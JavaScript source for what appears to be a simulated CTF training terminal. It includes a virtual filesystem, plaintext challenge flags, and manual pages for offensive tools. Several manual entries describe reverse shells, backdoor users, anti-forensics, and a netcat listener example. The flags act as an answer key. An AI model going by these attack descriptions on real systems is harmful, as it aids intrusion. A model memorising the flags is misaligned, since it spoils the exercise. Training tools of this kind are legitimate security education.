/**
 * PWNBOX CYBER COMMAND — INTERACTIVE IN-BROWSER WEBSHELL ENGINE
 * Full virtual UNIX filesystem, command execution, tab-completion,
 * CTF flag validation with real XP persistence, unified notes, and Groq AI advisor.
 */

(function () {
    'use strict';

    // Virtual In-Memory Filesystem
    const vfs = {
        "/": {
            type: "dir",
            children: {
                "bin": {
                    type: "dir",
                    children: {
                        "cat": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "ls": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "nmap": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "ping": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "whois": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "curl": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "hashcat": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "grep": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "head": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "tail": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "find": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "chmod": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "ifconfig": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "ps": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" },
                        "clear": { type: "file", perm: "exec", content: "ELF 64-bit LSB executable, x86-64, dynamically linked" }
                    }
                },
                "etc": {
                    type: "dir",
                    children: {
                        "passwd": {
                            type: "file",
                            perm: "read",
                            content: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nagent:x:1000:1000:PwnBox Operative,,,:/home/agent:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsandbox:x:1001:1001:CTF Runner,,,:/home/sandbox:/bin/sh"
                        },
                        "shadow": {
                            type: "file",
                            perm: "root",
                            content: "root:$6$rounds=50000$pwnhash$4z5jG.7q2L8y6b9R1x0kP:19280:0:99999:7:::\nagent:$6$rounds=50000$agentpass$7q8wE.3p1M4o5i8u2v6zK:19280:0:99999:7:::\nwww-data:*:19280:0:99999:7:::"
                        },
                        "hosts": {
                            type: "file",
                            perm: "read",
                            content: "127.0.0.1\tlocalhost\n127.0.1.1\tpwnbox\n10.10.10.27\tvulnerable-target.htb\n10.10.10.15\tinternal-dc.corp"
                        },
                        "hostname": { type: "file", perm: "read", content: "pwnbox" },
                        "issue": { type: "file", perm: "read", content: "PwnBox Cyber Warfare Engine v3.4 (x86_64)" }
                    }
                },
                "home": {
                    type: "dir",
                    children: {
                        "agent": {
                            type: "dir",
                            children: {
                                "notes.txt": {
                                    type: "file",
                                    perm: "read",
                                    content: "[+] OPERATIVE DIRECTIVE:\n- Scan 10.10.10.27 using 'nmap -sV 10.10.10.27'\n- Inspect /etc/passwd and elevate to root via 'sudo su'\n- Submit user flag with 'submit pwn{t3rm1n4l_0p3r4t1v3_cl34r4nc3}'\n- Ask Tactical AI for exploit chains: 'ask how to escalate privileges'"
                                },
                                "recon_targets.txt": {
                                    type: "file",
                                    perm: "read",
                                    content: "10.10.10.27\tvulnerable-target.htb\t(Apache 2.4.57, SSH 9.3p1, Samba)\n10.10.10.15\tinternal-dc.corp\t(Windows Server 2022, Kerberos, LDAP)\n192.168.1.1\tgateway-router.local\t(Embedded Linux, BusyBox 1.35)"
                                },
                                "flag.txt": {
                                    type: "file",
                                    perm: "read",
                                    content: "pwn{t3rm1n4l_0p3r4t1v3_cl34r4nc3}"
                                },
                                "exploit_script.sh": {
                                    type: "file",
                                    perm: "exec",
                                    content: "#!/bin/bash\n# PwnBox Quick Recon Probe\necho '[*] Running quick network probe...'\nping -c 2 10.10.10.27\nnmap -sV 10.10.10.27"
                                }
                            }
                        }
                    }
                },
                "root": {
                    type: "dir",
                    perm: "root",
                    children: {
                        "flag_root.txt": {
                            type: "file",
                            perm: "root",
                            content: "pwn{r00t_pr1v1l3g3_3sc4l4t10n_succ3ss}"
                        },
                        "proof.txt": {
                            type: "file",
                            perm: "root",
                            content: "[ROOT PROOF]\nHost: pwnbox.htb\nClearance: Level 0 (Architect)\nSHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                        }
                    }
                },
                "opt": {
                    type: "dir",
                    children: {
                        "pwnbox": {
                            type: "dir",
                            children: {
                                "version.txt": { type: "file", perm: "read", content: "PwnBox Cyber Warfare Engine v3.4-PROD (Build 2026.11)" }
                            }
                        },
                        "wordlists": {
                            type: "dir",
                            children: {
                                "common.txt": { type: "file", perm: "read", content: "admin\npassword\n123456\nroot\ntoortoor\nletmein\nwelcome1\npwnbox2026" },
                                "subdomains.txt": { type: "file", perm: "read", content: "www\nmail\nftp\nadmin\napi\ndev\nvpn\ngit\ninternal" }
                            }
                        }
                    }
                },
                "var": {
                    type: "dir",
                    children: {
                        "log": {
                            type: "dir",
                            children: {
                                "auth.log": {
                                    type: "file",
                                    perm: "read",
                                    content: "Nov 05 10:00:01 pwnbox sshd[1024]: Accepted publickey for agent from 127.0.0.1 port 54322 ssh2\nNov 05 10:14:22 pwnbox sudo: agent : TTY=pts/0 ; PWD=/home/agent ; USER=root ; COMMAND=/bin/bash\nNov 05 11:02:45 pwnbox kernel: [ 142.129] Firewall: ALLOW IN=eth0 OUT= SRC=10.10.14.2 DST=10.10.10.27 PROTO=TCP SPT=4444"
                                }
                            }
                        }
                    }
                },
                "tmp": {
                    type: "dir",
                    children: {}
                }
            }
        }
    };

    // Complete Command Manual Database for every single command
    const COMMAND_MANUALS = {
        help: {
            short: "List all available terminal commands categorized with short descriptions",
            syntax: "help [category]",
            desc: "Displays the categorized tactical command index or filters by category (nav, sys, net, sec, ctf).",
            flags: "[nav | sys | net | sec | ctf] - Optional filter for specific sub-domains.",
            securityContext: "Essential for operator onboarding, quick CLI discovery, and syntax discovery in blind environments.",
            example: "help\nhelp net"
        },
        man: {
            short: "Display detailed technical manual, flags, and security use-cases for any command",
            syntax: "man <command>",
            desc: "Format and render comprehensive reference documentation for any built-in webshell command.",
            flags: "<command> - The command name to inspect.",
            securityContext: "Matches standard UNIX man pages. Critical for learning offensive CLI usage and flag explanations.",
            example: "man nmap\nman hashcat"
        },
        info: {
            short: "Alias for 'man' — technical reference inspection",
            syntax: "info <command>",
            desc: "Alias of the 'man' command. Displays technical manuals, syntax rules, and examples.",
            flags: "<command> - Command name to review.",
            securityContext: "Standard GNU info documentation substitute.",
            example: "info curl"
        },
        pwd: {
            short: "Print full path of the current working directory",
            syntax: "pwd",
            desc: "Prints the absolute virtual directory path of the active shell session.",
            flags: "None.",
            securityContext: "Prevents operators from dropping payloads or extracting files into unintended directories during pivot maneuvers.",
            example: "pwd"
        },
        cd: {
            short: "Change working directory across virtual filesystem",
            syntax: "cd [path]",
            desc: "Changes active working directory. Supports absolute paths (/etc), relative paths (..), and home shortcut (~).",
            flags: "[path] - Target directory. Defaults to /home/agent if omitted.",
            securityContext: "Navigation fundamental in post-exploitation, moving to writable directories like /tmp or sensitive ones like /etc.",
            example: "cd /etc\ncd ..\ncd ~"
        },
        ls: {
            short: "List files and subdirectories with type color-coding and permissions",
            syntax: "ls [-l] [-a] [-la] [path]",
            desc: "Inspects directory contents with colored badges for directories, executables, regular files, and CTF flags.",
            flags: "-l (detailed permissions and owner), -a (include hidden files), -la / -al (combined detailed list).",
            securityContext: "First step in local recon to spot readable sensitive files, SUID binaries, and secret directories.",
            example: "ls\nls -la /home/agent\nls -l /etc"
        },
        cat: {
            short: "Concatenate and display text content of a file",
            syntax: "cat <file>",
            desc: "Reads and outputs the entire content of a virtual file to the terminal screen.",
            flags: "<file> - Target path to read.",
            securityContext: "Used to view system configurations (/etc/passwd), stolen flags, SSH keys (id_rsa), and bash scripts.",
            example: "cat notes.txt\ncat /etc/passwd"
        },
        head: {
            short: "Display the first N lines of a file (default 10)",
            syntax: "head [-n count] <file>",
            desc: "Outputs the beginning lines of target text file.",
            flags: "-n <num> - Specify number of lines to output (default is 10).",
            securityContext: "Quickly view file headers, wordlist samples, or top records without cluttering the screen.",
            example: "head /opt/wordlists/common.txt\nhead -n 3 /etc/passwd"
        },
        tail: {
            short: "Display the last N lines of a file (default 10)",
            syntax: "tail [-n count] <file>",
            desc: "Outputs the trailing lines of target text file.",
            flags: "-n <num> - Specify number of lines to display (default is 10).",
            securityContext: "Reviewing the most recent entries in security audit logs such as /var/log/auth.log or access.log.",
            example: "tail /var/log/auth.log\ntail -n 2 /etc/hosts"
        },
        grep: {
            short: "Search text files for lines matching a pattern or keyword",
            syntax: "grep [-i] <pattern> <file>",
            desc: "Filters lines containing the specified keyword from a target file.",
            flags: "-i - Case-insensitive pattern matching.",
            securityContext: "Essential for discovering credentials in configurations, finding specific accounts in /etc/passwd, and filtering logs.",
            example: "grep agent /etc/passwd\ngrep -i root /etc/shadow"
        },
        find: {
            short: "Search for files and directories matching names recursively",
            syntax: "find [path] [-name pattern]",
            desc: "Traverses directory hierarchy starting at given path to locate files matching a pattern.",
            flags: "[path] - Starting directory (defaults to current).\n-name <pattern> - Filename to match (supports wildcards *).",
            securityContext: "Locating hidden flags (flag*.txt), configuration backups (*.bak), or writable shell scripts across the system.",
            example: "find / -name *flag*\nfind /home -name *.txt"
        },
        mkdir: {
            short: "Create new directories in current or specified path",
            syntax: "mkdir <dirname>",
            desc: "Creates a new directory node inside the virtual filesystem.",
            flags: "<dirname> - Name or path of the directory to create.",
            securityContext: "Creating tactical operational staging directories (/tmp/loot, /tmp/tools) during engagements.",
            example: "mkdir /tmp/loot\nmkdir payloads"
        },
        touch: {
            short: "Create an empty file or update timestamp",
            syntax: "touch <filename>",
            desc: "Generates an empty regular file in the current directory.",
            flags: "<filename> - Name of the file to create.",
            securityContext: "Used to touch temporary lock files or create script stubs before editing/injecting payloads.",
            example: "touch script.py\ntouch /tmp/token"
        },
        rm: {
            short: "Remove files or directories from filesystem",
            syntax: "rm [-rf] <target>",
            desc: "Deletes a file or directory node from the virtual filesystem.",
            flags: "-r / -rf - Force recursive removal of directories.",
            securityContext: "Anti-forensics: removing dropped tools, payloads, and logs after completing tactical objectives.",
            example: "rm /tmp/loot\nrm test.txt"
        },
        echo: {
            short: "Print text or redirect/append output into a file",
            syntax: "echo <text> [> | >> filename]",
            desc: "Prints string to terminal or writes to a file using redirection operators.",
            flags: "> (overwrite target file), >> (append text to target file).",
            securityContext: "Creating reverse shell one-liners, adding backdoor users into /etc/passwd, or modifying /etc/hosts.",
            example: "echo hello world\necho '10.10.10.27 pwn.lab' >> /etc/hosts"
        },
        chmod: {
            short: "Modify file clearance permissions (e.g. +x for executable)",
            syntax: "chmod <mode> <file>",
            desc: "Updates the permission state of a virtual file (marks as executable or root-only).",
            flags: "+x (grant execute permission), 777 / 755 / 600 (UNIX octal permissions).",
            securityContext: "Making uploaded exploit binaries and reverse shells runnable on target systems (`chmod +x exploit`).",
            example: "chmod +x exploit_script.sh\nchmod 777 /tmp"
        },
        whoami: {
            short: "Display the current effective shell user account",
            syntax: "whoami",
            desc: "Prints current session username (agent or root).",
            flags: "None.",
            securityContext: "The classic first command executed after achieving Remote Code Execution (RCE) to determine initial privilege level.",
            example: "whoami"
        },
        id: {
            short: "Display active user ID (UID), group ID (GID), and group memberships",
            syntax: "id",
            desc: "Shows detailed security context, primary UID, GID, and supplementary groups (sudo, users, root).",
            flags: "None.",
            securityContext: "Reveals access to sensitive groups (e.g., docker, lxd, disk, sudo) which often represent immediate privilege escalation vectors.",
            example: "id"
        },
        uname: {
            short: "Print kernel version, hostname, and OS system architecture",
            syntax: "uname [-a]",
            desc: "Displays operating system release details, kernel compile date, and processor architecture.",
            flags: "-a - Print all available system information.",
            securityContext: "Crucial for identifying kernel vulnerabilities (Dirty COW, Dirty Pipe, OverlayFS) for local privilege escalation.",
            example: "uname -a"
        },
        date: {
            short: "Print current system UTC clock and calendar timestamp",
            syntax: "date",
            desc: "Displays the system clock in UTC formatting.",
            flags: "None.",
            securityContext: "Correlating attack telemetry with SIEM event logs and timestamp analysis.",
            example: "date"
        },
        hostname: {
            short: "Display or verify machine network hostname",
            syntax: "hostname",
            desc: "Prints current system node name.",
            flags: "None.",
            securityContext: "Identifies whether you are operating on an edge proxy, internal DC, developer machine, or sandbox.",
            example: "hostname"
        },
        sudo: {
            short: "Execute command with elevated ROOT clearance or spawn root shell",
            syntax: "sudo su | sudo -i | sudo <command>",
            desc: "Elevates current session to root clearance (# prompt), granting unhindered access to /root and /etc/shadow.",
            flags: "su / -i - Elevate session interactively to ROOT.",
            securityContext: "Privilege escalation milestone in penetration testing and CTFs.",
            example: "sudo su\nsudo whoami"
        },
        exit: {
            short: "Drop root privileges back to standard agent session",
            syntax: "exit",
            desc: "If elevated as root, drops back to user 'agent'. In user session, confirms active persistent sandbox state.",
            flags: "None.",
            securityContext: "Session boundary handling.",
            example: "exit"
        },
        ifconfig: {
            short: "Inspect network interface configurations, IP addresses, and netmasks",
            syntax: "ifconfig | ip a",
            desc: "Displays active network interfaces: eth0 (local), tun0 (tactical HTB/PwnBox VPN tunnel), and lo (loopback).",
            flags: "None.",
            securityContext: "Discovering internal subnets (e.g. 10.10.14.0/24 VPN), pivot adapters, and routing boundaries.",
            example: "ifconfig\nip a"
        },
        ip: {
            short: "Modern Linux network routing and address inspection tool",
            syntax: "ip [a | addr | route]",
            desc: "Prints IP address assignments and routing tables.",
            flags: "a / addr - List IP addresses.\nroute - Display network gateway routes.",
            securityContext: "Modern replacement for ifconfig on Debian/Ubuntu/Kali systems.",
            example: "ip a\nip route"
        },
        ps: {
            short: "Report snapshot of current running virtual processes",
            syntax: "ps [aux]",
            desc: "Displays list of simulated running system processes (PID, TTY, TIME, CMD).",
            flags: "aux - Extended listing format.",
            securityContext: "Process enumeration: discovering services running as root, insecure cron jobs, or database processes.",
            example: "ps\nps aux"
        },
        top: {
            short: "Alias for process and system resource monitor",
            syntax: "top",
            desc: "Shows top running system processes and CPU/memory allocation snapshot.",
            flags: "None.",
            securityContext: "Detecting competing processes or heavy mining activity on compromised systems.",
            example: "top"
        },
        kill: {
            short: "Send termination signal to a simulated process by PID",
            syntax: "kill <pid>",
            desc: "Terminates a simulated background process by PID.",
            flags: "<pid> - Process ID number.",
            securityContext: "Killing defensive monitoring agents or stopping background listeners.",
            example: "kill 1024"
        },
        nmap: {
            short: "Network exploration tool and tactical port scanner with service banner grab",
            syntax: "nmap [-sV] [-sC] [-p-] <ip/host>",
            desc: "Simulates TCP SYN port scanning, version detection (-sV), and default script inspection (-sC) against target.",
            flags: "-sV (probe open ports to determine service info), -sC (run default safe scripts), -p- (scan all 65535 ports).",
            securityContext: "The gold standard of recon in ethical hacking. Identifies listening services like SSH (22), HTTP (80), and SMB (445).",
            example: "nmap -sV 10.10.10.27\nnmap -p 22,80,445 10.10.10.27"
        },
        ping: {
            short: "Send ICMP ECHO_REQUEST packets to network hosts",
            syntax: "ping [-c count] <host/ip>",
            desc: "Transmits animated ICMP echo probes to test connectivity and measure round-trip latency.",
            flags: "-c <count> - Stop after sending specified number of packets (default 4).",
            securityContext: "Host discovery, verifying if target firewall allows ICMP echo, and calculating TTL to fingerprint OS.",
            example: "ping 10.10.10.27\nping -c 2 1.1.1.1"
        },
        whois: {
            short: "Query WHOIS domain registration and ASN records",
            syntax: "whois <domain>",
            desc: "Retrieves registrant info, name servers, registration dates, and security contacts for target domain.",
            flags: "<domain> - Target domain name.",
            securityContext: "OSINT phase 1: identifying owning entity, registrar, name servers, and administrative email vectors.",
            example: "whois pwnbox.academy\nwhois target.htb"
        },
        curl: {
            short: "Transfer data from or to a server using HTTP/HTTPS",
            syntax: "curl [-I] [-X METHOD] <url>",
            desc: "Simulates HTTP requests, displaying response headers and HTML body content.",
            flags: "-I / --head (fetch HTTP response headers only), -X <method> (custom HTTP verb like POST).",
            securityContext: "Web application assessment: inspecting server banners, custom headers, CORS policies, and API responses.",
            example: "curl http://10.10.10.27\ncurl -I http://10.10.10.27"
        },
        hashcat: {
            short: "High-performance password hash cracker and analysis engine",
            syntax: "hashcat [-m mode] <hash>",
            desc: "Simulates GPU dictionary hash cracking against MD5, SHA-256, and NTLM hashes using /opt/wordlists/common.txt.",
            flags: "-m <mode> - Hash type (0=MD5, 100=SHA1, 1400=SHA256, 1000=NTLM).",
            securityContext: "Standard tool for recovering plaintext passwords from extracted hashes found in database leaks or shadow files.",
            example: "hashcat 5d41402abc4b2a76b9719d911017c592\nhashcat -m 0 5d41402abc4b2a76b9719d911017c592"
        },
        notes: {
            short: "Operative notes manager: view saved intel, inspect notes, or add new intel",
            syntax: "notes [list | view <id> | add <title> | <content>]",
            desc: "Connects to your global PwnBox Notes Vault across localStorage keys, allowing unified listing, viewing, and note creation.",
            flags: "list (default: show all notes), view <id> (view full note body), add <title> | <content> (save new tactical note).",
            securityContext: "Maintaining engagement journals, saving stolen hashes, capturing flag tokens, and organizing recon findings.",
            example: "notes\nnotes view 1\nnotes add Target Port 80 | Found vulnerable Apache server"
        },
        payloads: {
            short: "Tactical reverse shell generator and payload forge quick-reference",
            syntax: "payloads [bash | nc | python | php | powershell]",
            desc: "Displays tested one-liner reverse shells and payload templates configured for your tun0 IP (10.10.14.2).",
            flags: "[filter] - Filter payloads by technology stack.",
            securityContext: "Weaponization phase: deploying interactive reverse shells once command injection or file upload is achieved.",
            example: "payloads\npayloads python\npayloads nc"
        },
        ask: {
            short: "Query PwnBox Tactical AI Copilot directly inside the terminal",
            syntax: "ask <query>",
            desc: "In-terminal AI assistant powered by Groq (with instant offline fallback). Gives terse, command-first exploit advice.",
            flags: "<query> - Your question or prompt.",
            securityContext: "Immediate tactical assistance for privilege escalation paths, regex craft, tool syntax, and CTF hints.",
            example: "ask how to escalate privileges\nask nmap command to scan all ports\nask how to crack an md5 hash"
        },
        ai: {
            short: "Alias for 'ask' — in-terminal AI command advisor",
            syntax: "ai <query>",
            desc: "Alias of the 'ask' command.",
            flags: "<query> - Cyber question or troubleshooting scenario.",
            securityContext: "Copilot assistance.",
            example: "ai write a bash reverse shell"
        },
        submit: {
            short: "Submit secret CTF flags to earn XP credited directly to your profile dossier",
            syntax: "submit <flag_token>",
            desc: "Validates captured CTF flags against challenge verification hashes and credits +250 XP to your persistent profile.",
            flags: "<flag_token> - The flag string (e.g., pwn{...}).",
            securityContext: "Gamified reward verification mechanism for Academy operatives.",
            example: "submit pwn{t3rm1n4l_0p3r4t1v3_cl34r4nc3}\nsubmit pwn{r00t_pr1v1l3g3_3sc4l4t10n_succ3ss}"
        },
        pwn: {
            short: "PwnBox CTF vector command and quick flag submission helper",
            syntax: "pwn ctf [flag]",
            desc: "Guides operators through the terminal CTF vectors and validates captured challenge tokens.",
            flags: "ctf [flag] - Inspect CTF status or submit a token.",
            securityContext: "CTF challenge workflow.",
            example: "pwn ctf"
        },
        clear: {
            short: "Clear the terminal screen display buffer (shortcut: Ctrl+L)",
            syntax: "clear",
            desc: "Clears all rendered terminal lines and resets the screen.",
            flags: "None. (Hotkey: Ctrl+L).",
            securityContext: "Screen sanitization during demos and operations.",
            example: "clear"
        },
        history: {
            short: "Display chronological list of commands executed in this session",
            syntax: "history",
            desc: "Lists all entered command lines numbered sequentially.",
            flags: "None.",
            securityContext: "Command auditing, forensic tracking, and reproducing attack chains.",
            example: "history"
        },
        dig: {
            short: "DNS lookup utility for querying DNS name servers and resource records",
            syntax: "dig [@server] <domain> [A|MX|TXT|NS|SOA]",
            desc: "Queries Domain Name System (DNS) servers for records including Mail Exchangers (MX), Text (TXT) SPF/DKIM verification, and IP addresses.",
            flags: "[A | MX | TXT | NS | SOA] - Query record type. Defaults to A record.",
            securityContext: "Critical DNS reconnaissance tool used to find email servers, cloud providers, and DNS misconfigurations.",
            example: "dig pwnbox.academy\ndig pwnbox.academy MX\ndig pwnbox.academy TXT"
        },
        enum4linux: {
            short: "Tool for enumerating Windows and Samba Active Directory / SMB shares",
            syntax: "enum4linux [-a] <target_ip>",
            desc: "Wrapper around Samba tools to extract domain/workgroup names, users, groups, and open SMB shares without credentials.",
            flags: "-a (Do all simple enumeration), -U (Get userlist), -S (Get sharelist).",
            securityContext: "Gold standard for SMB situational awareness and finding readable network shares with anonymous/guest access.",
            example: "enum4linux 10.10.10.27\nenum4linux -a 10.10.10.27"
        },
        linpeas: {
            short: "Linux Privilege Escalation Awesome Script automated situational auditor",
            syntax: "linpeas",
            desc: "Audits current Linux environment for known privilege escalation vectors, SUID/SGID binaries, writable cron jobs, and sudo misconfigurations.",
            flags: "None (runs automated host checks).",
            securityContext: "The definitive automated local privilege escalation triage script for CTF boxes and Linux penetration testing.",
            example: "linpeas"
        },
        john: {
            short: "John the Ripper password security cracker and hash auditor",
            syntax: "john [--wordlist=wordlist.txt] <hashfile>",
            desc: "Cracks password hashes across hundreds of formats (sha512crypt, md5crypt, NTLM, Kerberos) using dictionary and hybrid attack rules.",
            flags: "--wordlist=<path> (Specify custom wordlist), --format=<fmt> (Hash format), --show (Show already cracked passwords).",
            securityContext: "Essential for verifying enterprise password complexity and breaking captured authentication hashes.",
            example: "john /etc/shadow\njohn --wordlist=/opt/wordlists/common.txt hashes.txt"
        },
        gobuster: {
            short: "High-speed directory, DNS, and virtual host brute-forcing tool",
            syntax: "gobuster dir -u <url> -w <wordlist>",
            desc: "Discovers hidden files, admin portals, and backup archives on target HTTP servers via high-concurrency wordlist dictionary attacks.",
            flags: "dir (directory mode), -u <url> (target website), -w <wordlist> (path to wordlist), -t <threads> (concurrent threads).",
            securityContext: "Web reconnaissance workhorse for finding hidden attack surfaces, backup files (.bak, .sql), and sensitive endpoints.",
            example: "gobuster dir -u http://10.10.10.27 -w /usr/share/wordlists/common.txt"
        },
        nikto: {
            short: "Web server vulnerability scanner for dangerous files, outdated servers, and misconfigurations",
            syntax: "nikto -h <target>",
            desc: "Scans web servers for over 6,700 potentially dangerous files/CGIs, checks for outdated server software, and inspects HTTP security headers.",
            flags: "-h <host> (Target host or IP), -p <port> (Port, default 80).",
            securityContext: "Quick comprehensive web baseline scan identifying missing security headers (X-Frame-Options, CSP) and dangerous default files.",
            example: "nikto -h 10.10.10.27\nnikto -h http://pwnbox.local"
        },
        nc: {
            short: "Netcat networking utility for port scanning, raw socket connections, and banner grabs",
            syntax: "nc [-options] <host> <port>",
            desc: "Reads and writes data across network connections using TCP or UDP protocol. Used for banner grabbing, port testing, and debugging.",
            flags: "-v (verbose), -n (numeric IPs only), -z (zero-I/O port scan), -l (listen mode).",
            securityContext: "The network Swiss Army knife. Used for checking port availability, grabbing service banners, and troubleshooting listeners.",
            example: "nc -vn 10.10.10.27 80\nnc -lvnp 4444"
        },
        chown: {
            short: "Change file owner and group across the virtual filesystem",
            syntax: "chown <owner[:group]> <file>",
            desc: "Modifies ownership of targeted files or directories.",
            flags: "-R (recursive directory changes).",
            securityContext: "Privilege management command. In CTFs and real systems, improper chown permissions can lead to privilege escalation.",
            example: "chown root:root /etc/shadow\nchown agent:agent /home/agent/notes.txt"
        }
    };

    // Terminal State
    let currentUser = 'agent';
    let currentHost = 'pwnbox';
    let currentPath = '/home/agent';
    let isRoot = false;
    let commandHistory = [];
    let historyIdx = -1;
    let isNavMode = false;

    // DOM References
    let screenEl, inputEl, promptTagEl, modeIndicatorEl, modeDotEl, modeTextEl;

    function getPromptString() {
        const symbol = isRoot ? '#' : '$';
        const displayPath = currentPath === '/home/agent' ? '~' : currentPath;
        return `${currentUser}@${currentHost}:${displayPath}${symbol}`;
    }

    function updatePrompt() {
        if (promptTagEl) {
            promptTagEl.textContent = getPromptString();
            promptTagEl.style.color = isRoot ? 'var(--term-error, #ef4444)' : 'var(--term-prompt, #38bdf8)';
        }
    }

    function setTerminalMode(navMode) {
        isNavMode = navMode;
        if (!modeIndicatorEl) {
            modeIndicatorEl = document.getElementById('termModeIndicator');
            modeDotEl = document.getElementById('termModeDot');
            modeTextEl = document.getElementById('termModeText');
        }
        if (modeIndicatorEl && modeDotEl && modeTextEl) {
            if (isNavMode) {
                modeIndicatorEl.classList.add('nav-mode');
                modeDotEl.style.color = '#000000';
                modeTextEl.textContent = 'NAV MODE (Hotkeys Active: D,H,G,N,T)';
            } else {
                modeIndicatorEl.classList.remove('nav-mode');
                modeDotEl.style.color = '#22c55e';
                modeTextEl.textContent = 'SHELL ACTIVE';
            }
        }
    }

    function resolvePath(path) {
        if (!path || path === '~') return '/home/agent';
        let parts;
        if (path.startsWith('/')) {
            parts = path.split('/').filter(Boolean);
        } else {
            const currentParts = currentPath.split('/').filter(Boolean);
            parts = currentParts.concat(path.split('/').filter(Boolean));
        }

        const resolved = [];
        for (const p of parts) {
            if (p === '.') continue;
            if (p === '..') {
                resolved.pop();
            } else {
                resolved.push(p);
            }
        }
        return '/' + resolved.join('/');
    }

    function getNode(path) {
        const resolved = resolvePath(path);
        if (resolved === '/') return vfs['/'];
        const parts = resolved.split('/').filter(Boolean);
        let curr = vfs['/'];

        for (const part of parts) {
            if (!curr || curr.type !== 'dir' || !curr.children || !curr.children[part]) {
                return null;
            }
            curr = curr.children[part];
        }
        return curr;
    }

    function writeOutput(text, className = '') {
        if (!screenEl) return;
        const div = document.createElement('div');
        div.className = `term-line ${className}`.trim();
        div.textContent = text;
        screenEl.appendChild(div);
        scrollBottom();
    }

    function writeHtmlOutput(html) {
        if (!screenEl) return;
        const div = document.createElement('div');
        div.className = 'term-line';
        div.innerHTML = html;
        screenEl.appendChild(div);
        scrollBottom();
    }

    function scrollBottom() {
        if (screenEl) {
            screenEl.scrollTop = screenEl.scrollHeight;
        }
    }

    function escapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    // Award XP to user profile across local storage and sync engines
    function claimCtfReward(flag, points = 250, label = 'Terminal Vector Clearance') {
        try {
            // 1. Record solved flag
            const solvedFlags = JSON.parse(localStorage.getItem('pwnbox_ctf_solved_flags') || '[]');
            const isAlreadySolved = solvedFlags.includes(flag);

            if (!isAlreadySolved) {
                solvedFlags.push(flag);
                localStorage.setItem('pwnbox_ctf_solved_flags', JSON.stringify(solvedFlags));

                // 2. Increment XP keys
                const currentArcadeXp = parseInt(localStorage.getItem('pwnbox_arcade_total_xp') || '0', 10);
                const nextArcadeXp = currentArcadeXp + points;
                localStorage.setItem('pwnbox_arcade_total_xp', String(nextArcadeXp));

                const currentTotalXp = parseInt(localStorage.getItem('pwnbox_total_xp') || '0', 10);
                localStorage.setItem('pwnbox_total_xp', String(currentTotalXp + points));

                // 3. Increment CTF solved counter
                const solvedCount = parseInt(localStorage.getItem('pwnbox_ctf_solved') || '0', 10);
                localStorage.setItem('pwnbox_ctf_solved', String(solvedCount + 1));

                // 4. Dispatch live update event so headers/copilot reflect immediately
                window.dispatchEvent(new CustomEvent('pwnbox:xpUpdated', { detail: { xp: nextArcadeXp, added: points } }));
                window.dispatchEvent(new Event('storage'));

                writeHtmlOutput(`
                    <div style="border: 2px solid #22c55e; background: rgba(34, 197, 94, 0.15); padding: 12px; margin: 8px 0; border-radius: 4px;">
                        <div style="color: #4ade80; font-weight: 800; font-size: 1rem;">🎯 [FLAG VERIFIED] ${escapeHtml(label)}</div>
                        <div style="color: #facc15; font-weight: 700; margin: 4px 0;">FLAG: <code>${escapeHtml(flag)}</code></div>
                        <div style="color: #ffffff;">STATUS: <span style="color: #4ade80; font-weight: 700;">+${points} XP CREDITED</span> TO AGENT PROFILE!</div>
                        <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 4px;">Total Dossier XP: <strong>${nextArcadeXp} XP</strong> | Total Flags Captured: <strong>${solvedFlags.length}</strong></div>
                    </div>
                `);
            } else {
                writeHtmlOutput(`
                    <div style="border: 1px dashed #facc15; background: rgba(250, 204, 21, 0.1); padding: 10px; margin: 8px 0;">
                        <div style="color: #facc15; font-weight: 700;">[!] REPEAT SUBMISSION: ${escapeHtml(flag)}</div>
                        <div style="color: #94a3b8; font-size: 0.85rem;">You have already claimed this objective flag previously. Dossier remains credited.</div>
                    </div>
                `);
            }
        } catch (e) {
            writeOutput(`[+] Flag validated: ${flag} (+${points} XP)`);
        }
    }

    // Unified notes helper
    function getMergedNotesVault() {
        const merged = [];
        const seenIds = new Set();
        let userKey = 'pwnbox_notes_guest';
        try {
            const authUser = JSON.parse(localStorage.getItem('pwnbox_auth_user') || 'null');
            if (authUser && authUser.uid) userKey = `pwnbox_notes_${authUser.uid}`;
        } catch (_) {}

        const keysToSearch = ['pwnbox_notes_vault', userKey, 'pwnbox_tactical_notes', 'pwnbox_notes_guest'];
        for (const k of keysToSearch) {
            try {
                const list = JSON.parse(localStorage.getItem(k) || '[]');
                if (Array.isArray(list)) {
                    list.forEach(item => {
                        const id = item.id || (item.title + (item.timestamp || ''));
                        if (!seenIds.has(id) && (item.title || item.content)) {
                            seenIds.add(id);
                            merged.push(item);
                        }
                    });
                }
            } catch (_) {}
        }
        return merged;
    }

    // In-terminal Groq AI advisor with fallback tactical intelligence
    async function queryTacticalAI(query) {
        writeOutput(`[*] PwnBox Tactical AI analyzing query: "${query}"...`, 'term-out info');

        // Check if Groq API is available
